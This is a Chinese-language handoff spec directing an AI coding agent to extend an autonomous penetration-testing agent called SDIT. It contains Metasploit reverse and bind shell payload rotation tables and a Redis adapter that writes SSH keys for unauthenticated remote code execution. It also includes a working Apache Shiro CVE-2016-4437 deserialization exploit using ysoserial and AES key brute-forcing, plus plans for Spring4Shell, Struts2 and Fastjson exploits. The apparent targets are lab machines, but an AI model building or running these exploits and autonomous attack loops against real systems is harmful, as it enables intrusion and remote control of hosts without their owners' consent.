# SDIT 后续改进 — P6/P7/P8 实施目标（新会话接力指令）

> **本文档用于在新会话中接力开发 SDIT 自进化渗透 Agent**
> 项目位置: `D:\agent-new\`（Windows 主机）+ `/root/agent-new/`（Kali VM 192.168.136.143）
> GitHub: https://github.com/momo0410/agent-new
> 当前 HEAD: `b1dcd88`（已完成 P0-P5）

---

## 0. 给接力 Agent 的开场白

你接手 SDIT 自进化渗透 Agent 项目。P0-P5 已完成（自进化闭环可工作），R1-R7 实测 45 次渗透验证通过。
本次任务：**在不修改 LLM 模型的前提下，通过架构升级解决 4 个能力缺口**，让 Agent 能完成更多靶机的完全渗透。

---

## 1. 必读：先用 5 分钟熟悉项目

1. 读 `docs/SELF_EVOLVING_AGENT_DESIGN.md` — 了解 P0-P3 闭环架构
2. 读 `docs/P0_P5_VALIDATION_REPORT.md` — 了解当前能做什么、做不到什么
3. 读 `docs/DUAL_HOST_SYNC.md` — 学会双端 Git 同步
4. 跑 `cd src-python && python -m pytest tests/test_p?_*.py -q` 看 70/70 全过

---

## 2. 本次任务范围

完成 **P6 + P7 + P8** 三个阶段（每个独立可交付，按顺序做）。
P9 留给后续，本次不做。

| 阶段 | 解决的问题 | 预计代码量 | 单测 |
|------|-----------|----------|------|
| P6 | exploit 失败不会换 payload；Agent 不会自我诊断失败原因 | ~500 行 | 16 测 |
| P7 | Redis/JMX/MongoDB 等协议特异性服务不会处理 | ~400 行 | 12 测 |
| P8 | 现代 Java 反序列化等复杂 exploit 打不动 | ~700 行 | 6 测 |

完成后 SDIT 预期能力：从"50% 靶机出 session" → "80% 靶机能完全渗透"。

---

## 3. P6 详细规范

### 3.1 ExploitRetryStrategy（payload 自动轮换）

**文件**: `src-python/app/services/pentest_agent/exploit_retry.py`（新建）

核心逻辑：每个 msf 模块维护 payload 优先级表，failed→自动换下一个。

```python
PAYLOAD_TIERS = {
    "exploit/unix/ftp/vsftpd_234_backdoor": [
        ("cmd/unix/interact", {}),
        ("cmd/unix/reverse_perl", {"LHOST": "AUTO", "LPORT": "4444"}),
        ("cmd/unix/reverse_python", {"LHOST": "AUTO", "LPORT": "4445"}),
        ("cmd/unix/bind_perl", {"RPORT": "4446"}),
    ],
    "exploit/multi/samba/usermap_script": [
        ("cmd/unix/reverse_netcat", {"LHOST": "AUTO", "LPORT": "4444"}),
        ("cmd/unix/reverse", {"LHOST": "AUTO", "LPORT": "4444"}),
        ("cmd/unix/bind_netcat", {"RPORT": "4444"}),
    ],
    "exploit/multi/misc/java_rmi_server": [
        ("java/meterpreter/reverse_tcp", {"LHOST": "AUTO", "LPORT": "4444"}),
        ("java/shell_reverse_tcp", {"LHOST": "AUTO", "LPORT": "4444"}),
        ("java/meterpreter/bind_tcp", {"RPORT": "4444"}),
    ],
    "exploit/unix/irc/unreal_ircd_3281_backdoor": [
        ("cmd/unix/reverse", {"LHOST": "AUTO", "LPORT": "4444"}),
        ("cmd/unix/reverse_perl", {"LHOST": "AUTO", "LPORT": "4444"}),
        ("cmd/unix/bind_perl", {"RPORT": "4444"}),
    ],
    # ... 至少覆盖 R1-R7 见过的 8 个核心模块
}

class ExploitRetryStrategy:
    def __init__(self, max_retries: int = 4):
        self.max_retries = max_retries
        self._attempts: dict[tuple[str, str], int] = {}

    def should_retry(self, exploit_module: str, surface_key: str,
                     last_result: str, lhost: str = "") -> Optional[dict]:
        """根据失败 evidence + 历史尝试次数，返回下一组 payload+args，
        或 None（应该放弃）。
        LHOST 用真实 Kali IP 填充 AUTO 占位。"""
        ...
```

**集成点**: `agent.py` task 执行返回后（搜索 `state.finalize_round`），在 finalize 之前插入重试逻辑。

### 3.2 ActionCritic（失败自我诊断）

**文件**: `src-python/app/services/pentest_agent/critic.py`（新建）

```python
CRITIC_SYSTEM = """你是渗透测试 Critic。诊断为什么这次 exploit 失败，给一个具体下一步建议。
不要复述 Actor 的思考，专注找失败关键原因。

输出 JSON:
{
  "failure_category": "payload_mismatch | network | target_patched | auth_required | other",
  "diagnosis": "<100 字内>",
  "next_step_suggestion": "<具体工具名 + 参数提示>"
}"""

class ActionCritic:
    def __init__(self, llm_callable: Callable[[str, str], str]):
        self.llm = llm_callable

    def critique(self, failed_task: dict, evidence: str) -> Optional[dict]:
        ...
```

**触发条件**: 在 `_auto_phase_switch` 前，如果最近 3 轮 task 都失败 且 phase 不是 init/done，
则跑 1 次 critic，把 `diagnosis + next_step_suggestion` 注入到 `state.attach_history_context()`，
让下一轮 LLM prompt 看到。

### 3.3 单测 `tests/test_p6_exploit_retry.py`（≥ 16 个测试）

必须覆盖：
- payload tier 顺序换
- max_retries 后停止
- "Exploit completed, but no session" 信号匹配
- 未知 module 的 fallback
- LHOST AUTO 替换正确
- ActionCritic JSON 解析
- ActionCritic LLM 失败 graceful
- 集成: 失败 → critic → 注入

---

## 4. P7 详细规范

### 4.1 协议适配器目录

**新建**: `src-python/app/services/pentest_agent/protocol_adapters/`

```
protocol_adapters/
  __init__.py             # 导出 register_protocol_tools()
  redis_adapter.py
  jmx_adapter.py
  mongo_adapter.py
  base.py                 # BaseProtocolAdapter 抽象类
```

### 4.2 RedisAdapter 实现

```python
# redis_adapter.py
import socket

class RedisAdapter:
    """Redis RESP 协议适配器。无密码/弱密码场景的未授权访问 + 主从 RCE。"""
    
    def __init__(self, host: str, port: int = 6379, password: str = "", timeout: int = 5):
        self.host = host; self.port = port; self.password = password; self.timeout = timeout
    
    def _send_raw(self, cmd: bytes) -> bytes:
        """裸 RESP 发送"""
        s = socket.create_connection((self.host, self.port), timeout=self.timeout)
        try:
            if self.password:
                auth = f"*2\r\n$4\r\nAUTH\r\n${len(self.password)}\r\n{self.password}\r\n".encode()
                s.send(auth); s.recv(1024)
            s.send(cmd)
            return s.recv(65536)
        finally:
            s.close()
    
    def info(self) -> dict:
        """redis INFO 命令，返回服务器版本/配置"""
        resp = self._send_raw(b"*1\r\n$4\r\nINFO\r\n")
        # 解析 RESP bulk string
        ...
    
    def config_get(self, key: str) -> dict:
        ...
    
    def config_set(self, key: str, value: str) -> bool:
        ...
    
    def write_ssh_key(self, public_key: str, ssh_dir: str = "/root/.ssh/") -> dict:
        """经典 unauth Redis RCE:
        1. config set dir /root/.ssh/
        2. config set dbfilename authorized_keys
        3. set x "\n\nssh-rsa AAAA...\n\n"
        4. save
        返回 {success: bool, evidence: [...]}
        """
        ...
    
    def slave_of(self, master_host: str, master_port: int) -> bool:
        """主从复制 RCE 准备（指向恶意 master）"""
        ...
```

### 4.3 JMXAdapter（Java JMX RMI）

```python
# jmx_adapter.py
# 需要 jython 或 pyjnius；如果不可用就 fallback 调 nmap script jmx-info
class JMXAdapter:
    def list_mbeans(self) -> list[str]: ...
    def invoke(self, mbean: str, method: str, args: list) -> str: ...
```

### 4.4 MongoAdapter

```python
# mongo_adapter.py
class MongoAdapter:
    """MongoDB 未授权访问。pymongo 是标准方法。"""
    def list_databases(self) -> list[str]: ...
    def list_collections(self, db: str) -> list[str]: ...
    def find_sample(self, db: str, coll: str, limit: int = 5) -> list: ...
```

### 4.5 注册到 tools.toml

```toml
[[tool]]
name = "redis_eval"
command = "redis_eval {args}"
description = "Redis RESP 协议工具。args: JSON {host, port, action: info|config_get|config_set|write_ssh_key|slave_of, ...}"
timeout = 30
parser = "parse_raw"
risk = "high"
source = "protocol_adapter"

[[tool]]
name = "jmx_invoke"
command = "jmx_invoke {args}"
description = "Java JMX MBean 调用。args: JSON {host, port, mbean, method, args}"
timeout = 30
parser = "parse_raw"
risk = "high"
source = "protocol_adapter"

[[tool]]
name = "mongo_eval"
command = "mongo_eval {args}"
description = "MongoDB 未授权访问。args: JSON {host, port, action: list_dbs|list_colls|find, ...}"
timeout = 30
parser = "parse_raw"
risk = "high"
source = "protocol_adapter"
```

### 4.6 executor.py 加 dispatch

```python
# 在 Executor.run() 方法开头加（约 line 1280）:
if tool in ("redis_eval", "jmx_invoke", "mongo_eval"):
    return self._dispatch_protocol_adapter(tool, args)
```

### 4.7 _LLM_ALWAYS_VISIBLE 加入

```python
# executor.py: line 313 附近
_LLM_ALWAYS_VISIBLE = {
    ...,  # 现有项
    "search_cve", "search_exploit", "lookup_msf_module", "lookup_default_creds",
    # P7 新增:
    "redis_eval", "jmx_invoke", "mongo_eval",
}
```

### 4.8 单测 `tests/test_p7_protocol_adapters.py`（≥ 12 个测试）

每个 adapter 至少 4 个 test，mock socket / pymongo / pyjnius。

---

## 5. P8 详细规范

### 5.1 创建 payload 模板目录

**新建**: `D:\agent-new\exploits\`（项目根，不在 src-python 下，便于独立维护）

```
exploits/
  README.md
  _common/
    msf_lhost.py            # 自动检测 Kali IP 当 LHOST
    payload_runner.py       # 启动 listener + 触发 exploit + 等 session
  shiro/
    cve-2016-4437.py        # 完整流程
    aes_keys.txt            # 前 50 个常见 key
  jenkins/
    groovy_console_rce.py   # CVE-2018-1000861 / 弱凭据 manager
  fastjson/
    cve-2017-18349_jndi.py  # 用 marshalsec 启动 LDAP server
  struts2/
    s2-057.py               # OGNL 命名空间
    s2-061.py
  tomcat/
    cve-2017-12615_put_jsp.py
    war_upload_via_manager.py
  spring/
    cve-2022-22963.py
    cve-2022-22965.py        # Spring4Shell
```

每个 PoC 必须：
1. 接受 `--target <host> --port <N> --cmd <command>` 等统一参数
2. 输出结构化 JSON 包含 `{"success": bool, "evidence": "...", "session": {...}}`
3. 失败时 exit code != 0 + JSON 含 failure_reason

### 5.2 Shiro CVE-2016-4437 完整 PoC

```python
# exploits/shiro/cve-2016-4437.py
"""
Apache Shiro 1.2.4 反序列化漏洞利用。
需要 ysoserial.jar (在 /opt/exploit-tools/ysoserial-all.jar)
"""
import argparse, subprocess, base64, requests
from Crypto.Cipher import AES

DEFAULT_AES_KEYS = open(__file__.rsplit('/', 1)[0] + '/aes_keys.txt').read().split('\n')

def generate_payload(cmd: str, gadget: str = "CommonsCollections5") -> bytes:
    """调用 ysoserial 生成 payload"""
    return subprocess.check_output([
        "java", "-jar", "/opt/exploit-tools/ysoserial-all.jar",
        gadget, cmd,
    ])

def encrypt_payload(raw: bytes, key: bytes) -> bytes:
    cipher = AES.new(key, AES.MODE_CBC, b"\x00" * 16)
    pad_len = 16 - (len(raw) % 16)
    raw = raw + bytes([pad_len] * pad_len)
    return base64.b64encode(b"\x00" * 16 + cipher.encrypt(raw))

def exploit(target: str, port: int, cmd: str):
    for key_b64 in DEFAULT_AES_KEYS:
        key = base64.b64decode(key_b64.strip())
        payload = encrypt_payload(generate_payload(cmd), key)
        try:
            r = requests.get(f"http://{target}:{port}/", 
                            cookies={"rememberMe": payload.decode()},
                            timeout=10)
            if r.status_code == 200 and 'rememberMe=deleteMe' not in r.headers.get('Set-Cookie', ''):
                return {"success": True, "key": key_b64, "evidence": f"key={key_b64[:20]}..."}
        except Exception:
            continue
    return {"success": False, "failure_reason": "no AES key matched"}

if __name__ == "__main__":
    import json
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", required=True)
    ap.add_argument("--port", type=int, default=8080)
    ap.add_argument("--cmd", required=True)
    args = ap.parse_args()
    print(json.dumps(exploit(args.target, args.port, args.cmd)))
```

### 5.3 注册 exploit_lab 元工具

```toml
[[tool]]
name = "exploit_lab"
command = "exploit_lab {args}"
description = "Curated exploit 库。args: '<product>/<name> --target <host> --port <N> --cmd <cmd>' 例: 'shiro/cve-2016-4437 --target 127.0.0.1 --port 8093 --cmd id'"
timeout = 120
parser = "parse_raw"
risk = "critical"
source = "exploit_lab"
```

### 5.4 executor.py 加 exploit_lab dispatcher

```python
def _dispatch_exploit_lab(self, args: str) -> dict:
    """args 第一段是 <product>/<name>，剩下是 PoC 参数"""
    parts = args.strip().split(None, 1)
    if not parts: return {"status": "failed", "result": "exploit_lab: 缺少参数"}
    poc_path = Path(EXPLOITS_ROOT) / parts[0].replace("/", os.sep) + ".py"
    if not poc_path.exists():
        return {"status": "failed", "result": f"PoC 不存在: {parts[0]}"}
    poc_args = parts[1] if len(parts) > 1 else ""
    cmd = f"python3 {poc_path} {poc_args}"
    return self._run_local_shell(cmd, ...)
```

### 5.5 在 Kali 准备工具链

```bash
ssh root@192.168.136.143 'mkdir -p /opt/exploit-tools && cd /opt/exploit-tools && \
  wget -q https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar && \
  wget -q https://github.com/mbechler/marshalsec/releases/download/0.0.3/marshalsec-0.0.3-SNAPSHOT-all.jar && \
  pip install pycryptodome requests'
```

### 5.6 单测 `tests/test_p8_exploit_lab.py`（≥ 6 个）

不需要真触发 exploit，测试：
- exploit_lab dispatch 正确路由到 PoC 脚本
- PoC 参数转发
- 失败 PoC graceful 返回
- 至少 1 个 PoC（shiro）能 dry-run（mock subprocess）

---

## 6. 完成后必须做的验证

### 6.1 单测全过

```bash
cd /d/agent-new/src-python && python -m pytest tests/ -q
# 应该是 70 + 16 + 12 + 6 = 104 通过
```

### 6.2 R8 端到端实测

push 代码后在 Kali 启动：

```bash
ssh root@192.168.136.143 'cd /root/agent-new && source .venv/bin/activate &&
SDIT_SSH_HOST=local nohup python3 batch_pentest.py \
  --targets \
    R8-MSF2=192.168.136.137 \
    R8-redis=127.0.0.1:6379 \
    R8-shiro=127.0.0.1:8093 \
  --max-rounds 12 --skill-limit 6 --out-root reports/R8 \
  > reports/R8.log 2>&1 &'
```

**预期成功标准**：
- R8-MSF2: sessions ≥ 3（vsftpd / 1524 / IRC 三个都拿到）— 验证 P6 ExploitRetry 生效
- R8-redis: sessions ≥ 1，且 evidence 含真实 RESP 命令输出 — 验证 P7 RedisAdapter 生效
- R8-shiro: vulns ≥ 1，evidence 含 AES key fingerprint — 验证 P8 PoC 触发

### 6.3 更新文档

完成 P6-P8 后写：
- `docs/P6_P8_VALIDATION_REPORT.md`（按 P0_P5 报告的格式）
- `docs/P6_P8_IMPROVEMENT_PLAN.md` 中标记完成项

### 6.4 commit + push

每个 P 阶段单独 commit：
- `feat(P6): ExploitRetryStrategy + ActionCritic`
- `feat(P7): protocol adapters (redis/jmx/mongo)`
- `feat(P8): curated exploit lab with ysoserial`

---

## 7. 关键技术备注

1. **mimo-v2.5 LLM 客户端**: `app.services.pentest_agent.llm_client.LLMClient.chat()` 是 **async**。
   ActionCritic 调用要用 `asyncio.run()` 包装，参考 reflection.py 的 `_reflection_llm()` 函数。

2. **Kali IP 自动识别**: ExploitRetry 的 LHOST="AUTO" 替换逻辑可以用：
   ```python
   import socket
   s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
   s.connect(("192.168.136.137", 80))   # 任何外部 IP
   kali_ip = s.getsockname()[0]   # 192.168.136.143
   s.close()
   ```

3. **不要破坏 P0-P5 的现有功能**。每次 commit 前必须确认 70/70 老测试还过。

4. **不要修改 agent.run() 的对外签名**。新增功能用环境变量或可选 kwargs。

5. **双端同步**: 如果 Kali DNS 不通走 scp 直传。详见 `docs/DUAL_HOST_SYNC.md`。

6. **OnlineSearchService 已就绪但 LLM 不调用**: 这不是 bug，是模型行为。**不需要修**。

7. **避免命名冲突**: 不要起 `_LLM_HIDDEN_NAMES` 里已有的工具名。

---

## 8. 完成后向用户汇报的格式

简短汇报 + docx 报告（参考 `C:\Users\T1367\Desktop\SDIT渗透Agent验证报告.docx` 的结构）。
重点说：
- 每个 P 解决了什么具体问题
- R8 实测结果对比 R1-R7
- 当前能完成的靶机比例从多少升到多少
- 还有什么解决不了（如果有）

---

## 9. 工时预估

| 阶段 | 设计 | 编码 | 测试 | 实测验证 | 合计 |
|------|------|------|------|---------|------|
| P6 | 30 min | 3 h | 1.5 h | 1 h | 6 h |
| P7 | 30 min | 4 h | 2 h | 1.5 h | 8 h |
| P8 | 1 h | 6 h | 1.5 h | 2 h | 10.5 h |
| **合计** | 2 h | 13 h | 5 h | 4.5 h | **~24.5 h** |

可以分多次会话完成。每完成一个 P 就 commit + push。
